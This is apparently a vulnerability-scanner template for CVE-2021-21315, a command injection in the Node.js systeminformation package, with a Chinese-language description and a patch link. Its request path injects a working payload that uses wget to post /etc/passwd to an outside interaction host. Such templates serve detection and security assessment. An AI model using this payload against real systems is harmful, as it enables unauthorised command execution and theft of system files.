id: CVE-2021-21315
info:
  name: Node.js Systeminformation Command Injection
  author:
  - l0ne1y
  description: |
    Systeminformation 命令注入漏洞
    systeminformation 是一个轻量级的 Node.js 组件，开发者可以在项目中加入该组件，以检索与 CPU、硬件、电池、网络、服务和系统进程相关的系统信息。

    Systeminformation 中存在操作系统命令注入漏洞，该漏洞源于外部输入数据构造操作系统可执行命令过程中，网络系统或产品未正确过滤其中的特殊字符、命令等。攻击者可利用该漏洞执行非法操作系统命令。
  severity: high
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://github.com/sebhildebrandt/systeminformation/commit/07daa05fb06f24f96297abaa30c2ace8bfd8b525
requests:
- matchers:
  - type: word
    part: header
    words:
    - application/json
  - type: word
    condition: and
    part: body
    words:
    - wget --post-file /etc/passwd {{interactsh-url}}
    - name
    - running
    - pids
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/api/getServices?name[]=$(wget%20--post-file%20/etc/passwd%20{{interactsh-url}})'
  method: GET
